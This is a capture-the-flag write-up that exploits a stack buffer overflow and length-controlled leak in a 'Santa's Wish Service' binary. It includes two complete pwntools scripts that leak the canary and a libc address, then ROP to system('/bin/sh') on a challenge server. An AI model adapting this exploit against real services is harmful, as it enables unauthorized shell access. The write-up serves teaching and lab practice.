# 14 - Santa's Wish Service

## Description

Santa's elves attended a programming course. With their new skills they started implementing a service which can be used
by everyone to hand in their Christmas wishes. The elves don't have any experience in such tasks, so they are hoping
that nobody makes their heart bleed.

## Solution

For this challenge we are given a binary as well as a libc. It is clear that we will have to exploit the binary on a
server and get a shell. Let's do this in three steps: first I reverse the binary and find the vulnerability. Then, in a
second step, I exploit the binary locally and finally on the remote target.

### Finding the vuln

I decompiled the binary using ghidra. The interesting parts are the following:

```c
int ret;
char option_given;
ushort amount_given;
char wish_content [200];

init_buffering();
banner();

while( true ) {
  print(&options);
  ret = fscanf(stdin, "%hhu", &option_given);

  if (ret != 1 || option_given != 1) {
    break;
  }

  print(&amount);
  ret = fscanf(stdin, "%hu", &amount_given);

  if (ret != 1) {
    break;
  }

  print(&wish);
  read(0, wish_content, 512);
  print(&wish_given);
  write(1, wish_content, amount_given);
}

``` 

First of all we have a buffer overflow when reading into `wish_content` since we are reading 512 chars but only allocate
space for 200 chars. Furthermore we can leak content with `write(1, wish_content, amount_given)` since we control
`amount_given`.

We can assume that ASLR is enabled on the server. Checking the security of the binary, we can see the following:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

This means we have to use ROP and take care of the stack canary. The plan is the following:

1. Leak the canary
2. Leak a libc address
3. Calculate the libc offset
4. Use ROP to jump to `system('/bin/sh')` while keeping the canary intact

### Local exploit

To take a look at the binary in action, I used pwndbg. I set a breakpoint before the `write()` and entered 199 `A`s. At
that point the stack looked like this:

``` 
02:0010│ rax rsi 0x7fffffffde00 ◂— 0x4141414141414141 ('AAAAAAAA')
... ↓            23 skipped
1a:00d0│         0x7fffffffdec0 ◂— 'AAAAAAA\n'
1b:00d8│         0x7fffffffdec8 ◂— 0x4105912ff54c6700
1c:00e0│ rbp     0x7fffffffded0 ◂— 0x0
1d:00e8│         0x7fffffffded8 —▸ 0x7ffff7de20b3 (__libc_start_main+243) ◂— mov    edi, ea
```

We can see the 199 `A`s followed by what looked to be the stack canary. Then we can see 8 bytes that are empty and
finally we have the `lic_start_main`. Now we just have to leak the stack content, grab the canary and the
`libc_start_main`. Once we have those we can use ROP to get a shell as follows:

```python
from pwn import *
import struct

context.arch='amd64'

e = ELF("./service")
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

io = e.process()

io.recvuntil(b"Exit")
io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"250")
io.recvuntil(b">")
io.sendline(199 * "A".encode("ascii"))
output = io.recvuntil(b">")

canary = output[245:253]
ret = output[261:269]

print('Canary: ' + canary.hex())
print('Previous return: ' + ret.hex())

offset = int.from_bytes(ret, byteorder="little") - libc.libc_start_main_return
libc.address = offset

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b'/bin/sh')))
payload = flat(200 * "A", canary, 8 * "B", rop.chain())

io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"234")
io.recvuntil(b">")
io.sendline(payload)

io.interactive()
```

This worked locally on my machine and gave me a shell.

### Remote exploit

The above exploit didn't work remotely at first. After a while I remembered that it might be due to an unaligned stack
(I had this problem before with other challenges). To fix that problem I simply added a `ret` gadget and got a remote
shell. The complete exploit can be seen here:

```python
from pwn import *
import struct

context.arch='amd64'

e = ELF("./service")
libc = ELF('./libc.so.6')

io = remote('a9fba9e9-2eb8-4771-bb73-b6d094d4edb0.rdocker.vuln.land', 1337)

io.recvuntil(b"Exit")
io.recvuntil(b">")
io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"250")
io.recvuntil(b">")
io.sendline(199 * "A".encode("ascii"))
output = io.recvuntil(b">")

print(output.hex())

canary = output[245:253]
ret = output[261:269]

print('Canary: ' + canary.hex())
print('Previous return: ' + ret.hex())

offset = int.from_bytes(ret, byteorder="little") - libc.libc_start_main_return
libc.address = offset

rop = ROP(libc)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(libc.search(b'/bin/sh')))
payload = flat(200 * "A", canary, 8 * "B", rop.chain())

io.sendline(b"1")
io.recvuntil(b">")
io.sendline(b"234")
io.recvuntil(b">")
io.sendline(payload)

io.interactive()
```

